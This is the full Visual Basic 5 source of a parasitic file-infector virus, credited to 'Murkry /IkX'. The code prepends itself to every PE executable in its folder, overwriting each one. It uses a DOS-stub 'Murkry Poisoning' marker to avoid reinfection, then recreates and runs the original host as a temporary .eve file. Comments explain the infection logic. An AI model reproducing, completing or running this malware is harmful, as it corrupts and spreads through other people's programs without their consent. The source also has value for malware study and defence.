   '   vbVirus by Murkry /IkX
   '   The First Parasitic VB5 Virus


   Option Explicit
   Private Victim As String     'holds the victim file name
   Private HostLen As Long      'hods the victim file lenght
   Private vbArray() As Byte   'hold the vbVirus code
   Private hArray() As Byte    'holds the victims code
   Private lenght As Long
   Const MySize As Integer = 14336  'vbVirus size

   Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
   Private Declare Function GetExitCodeProcess Lib "kernel32" (ByVal hProcess As Long, lpExitCode As Long) As Long
   Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
   Private iResult As Long
   Private hProg As Long
   Private idProg As Long
   Private iExit As Long
   Const STILL_ACTIVE As Long = &H103
   Const PROCESS_ALL_ACCESS As Long = &H1F0FFF

   Private Sub Form_Initialize()
       Dim i As Long
       On Error GoTo vbVerror  'If an error show the form
                               'Error will occur if the user starts and
                               'ends the infected program to quickly
                               'other error now Write access...

       'Copy the vbVirus code to an array to write out to a new file
       'in a infect file we would only want to read in the vbVirus code
       'which is why filecopy is not used here
           Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read _
                   As #1
               ReDim vbArray(MySize)
               Get #1, 1, vbArray
           Close #1

       'now copy the victim,into its array
       'and the append the two arrays into a file
       'overwriting the existing victim file

       Victim = Dir(App.Path & "\" & "*.EXE")
           While Victim <> ""

               If Format(Victim, ">") <> Format(App.EXEName & ".EXE", ">") Then
                   Open App.Path & "\" & Victim For Binary Access Read As #1
                       ReDim hArray(LOF(1))
                       Get #1, 1, hArray
                   Close #1

                       'To stop reinfection I make the DOS error msg say
                       ' db "Program can not run due to Murkry Poisoning.",0dh,0ah,24h
                       'I then check if the M in Murkry is there in all new files
                       'Yes this will infect any .exe including DOS files but the
                       'infected exe will fail under anything but a Win32 enviroment
                       'displaying the above msg
                   If hArray(&H69) <> &H4D Then

                       i = hArray(&H3C)
                       If hArray(i) = &H50 Then
                           Open App.Path & "\" & Victim For Binary Access Write As #1
                               Put #1, , vbArray
                               Put #1, MySize, hArray
                           Close #1
                       End If 'Make sure its a PE file
                   End If  'Simple check to make sure we are not reinfecting
               End If  'check for Current file name

           Victim = Dir()  'Get Next victim

         Wend

      'All possible exe's have been infected by the vbVirus
      'Now we need to generate the old host and spawn off it

       Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As #1
           lenght = LOF(1) - MySize
           If lenght <> 0 Then
               ReDim vbArray(lenght - 1)
               Get #1, MySize, vbArray
           Close #1

           Open App.Path & "\" & App.EXEName & ".eve" For Binary Access Write As #1
               Put #1, , vbArray
           Close #1
           'Routine to shell and wait for the host to close
           'then delete the file. If while running the host the
           'user copied that file he would have the orginal file back
           'so this is one way to disinfect

           idProg = Shell(App.Path & "\" & App.EXEName & ".eve", vbNormalFocus)
           hProg = OpenProcess(PROCESS_ALL_ACCESS, False, idProg)
           GetExitCodeProcess hProg, iExit
           Do While iExit = STILL_ACTIVE
               DoEvents
               GetExitCodeProcess hProg, iExit
           Loop
           Kill App.Path & "\" & App.EXEName & ".eve"

       Else
           Close #1

       End If

       End

   vbVerror:

   End Sub 'End the Init routines


   Private Sub cmdExit_Click()
       Unload Me
   End Sub
